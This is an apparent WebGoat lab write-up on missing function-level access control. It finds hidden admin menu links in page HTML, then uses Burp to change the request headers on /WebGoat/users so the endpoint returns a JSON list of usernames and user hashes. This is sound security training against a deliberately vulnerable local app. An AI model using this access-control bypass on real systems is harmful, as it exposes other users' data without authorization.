# Missing Function Level Access Control
## Relying on Obscurity
- hidden items
- HTML or javascript comments
- commented out elements
- items hidden via css controls/classes

## Exercise 1
Task 1: Find the hidden items

Inspect the elements of the menu
```html
<div class="menu-section ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content-active" id="ui-accordion-ac-menu-panel-0" aria-labelledby="ui-accordion-ac-menu-header-0" role="tabpanel" aria-expanded="true" aria-hidden="false" style="display: block; height: 110px;">
  <ul>
    <li>My Profile</li>
    <li>Privacy/Security</li>
    <li>Log Out</li>
  </ul>
</div>
```
Below this portion, search for `class="hidden-menu-item"`:
```html
<h3 class="hidden-menu-item menu-header ui-accordion-header ui-helper-reset ui-state-default ui-corner-all ui-accordion-icons" role="tab" id="ui-accordion-ac-menu-header-2" aria-controls="ui-accordion-ac-menu-panel-2" aria-selected="false" tabindex="-1">
  <span class="ui-accordion-header-icon ui-icon ui-icon-triangle-1-e"></span>
  Admin
</h3>
```
```html
<div class="menu-section hidden-menu-item ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" id="ui-accordion-ac-menu-panel-2" aria-labelledby="ui-accordion-ac-menu-header-2" role="tabpanel" aria-expanded="false" aria-hidden="true" style="display: none; height: 110px;">
  <ul>
    <li><a href="/users">Users</a></li>
    <li><a href="/config">Config</a></li>
  </ul>
</div>
```
Therefore:
```
Hidden Item 1 = Users
Hidden Item 2 = Config
```

## Exercise 2
Task: get hash of own user account

Using the /user url from the previous exercise, open tab and enter it in browser `http://localhost:8080/WebGoat/users`

Results:
```
2 Users in WebGoat
```

Intercept this GET request using burp
```
GET /WebGoat/users HTTP/1.1
Host: localhost:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=2028571AC38F0166BE61982DBA33B8E4
Connection: close
```
Change the `Accept` field to `application/json`, and add the `Content-Type` field with `application/json;charset=UTF-8`.
```
GET /WebGoat/users HTTP/1.1
Host: localhost:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: application/json
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=2028571AC38F0166BE61982DBA33B8E4
Connection: close
```
Results:
```
HTTP/1.1 200
X-Application-Context: application:8080
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
Content-Type: application/json;charset=UTF-8
Date: Sun, 21 Oct 2018 14:41:15 GMT
Connection: close
Content-Length: 237

[ {
  "username" : "csrf-tingle",
  "admin" : false,
  "userHash" : "Hi/W1zLGPYrFTfwVWwt9OSVmDi6D2yhBjEY8plZ6hAw="
}, {
  "username" : "tingle",
  "admin" : false,
  "userHash" : "eejTQQOde0mqy+5td9nuHNWSNrqrmrxBXCul+5cXRmk="
} ]
```
